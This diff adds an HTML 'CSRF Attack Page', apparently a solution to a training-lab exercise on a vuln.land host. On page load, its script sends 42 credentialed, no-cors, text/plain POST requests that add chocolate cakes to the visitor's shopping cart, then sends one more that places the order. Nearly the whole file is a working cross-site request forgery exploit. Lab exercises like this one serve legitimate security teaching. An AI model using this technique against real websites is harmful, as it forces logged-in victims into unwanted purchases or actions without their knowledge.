@@ -1,0 +1,71 @@
+
+<!-------------------
+    Instructions:
+    1. Add your attack code below.
+    2. You can access this HTML page at https://theia-698a87e4-69d1-4002-a770-3585da63d33c.i.vuln.land/attack.html
+--------------------->
+
+<html>
+<body>
+    <h1>CSRF Attack Page</h1>
+
+    <script>
+
+        /* CHANGEME: Use the UUID from your current lab instance */
+        const UUID = "6c2d92b4-1454-4e9a-b370-c030104dfe06";
+        
+        /* Execute the entire attack */
+        attack()
+
+        /* Function attack that calls two other functions to issue the requests */
+        async function attack() {
+            await add_cakes_to_cart(42);
+            await complete_order();
+        }
+
+        /* Adds n Choco cakes to the shopping cart */
+        async function add_cakes_to_cart(n) {
+
+            const url = "https://" + UUID + ".i.vuln.land/api/add_cart";
+            const data = {
+                    "name": "Choco",
+                    "price": 17,
+                    "pid": 1
+            };
+
+            for ( i = 0; i < n; ++i ) {
+                try {
+                    /* Add one cake to shopping cart */
+                    const r = await fetch(url, {
+                        method: "POST",
+                        credentials: "include",
+                        headers: {"Content-Type": "text/plain"},
+                        mode: 'no-cors',
+                        body: JSON.stringify(data)
+                    });
+                } catch(error) {
+                }
+            }
+        }
+
+        /* Complete the order */
+        async function complete_order() {
+
+            const url = "https://" + UUID + ".i.vuln.land/api/order";
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    credentials: "include",
+                    headers: {"Content-Type": "text/plain"},
+                    mode: 'no-cors',
+                    body: JSON.stringify({})
+                });
+            } catch(error) {
+                console.log(error)
+            }
+        }
+
+    </script>
+
+</body>
+</html>
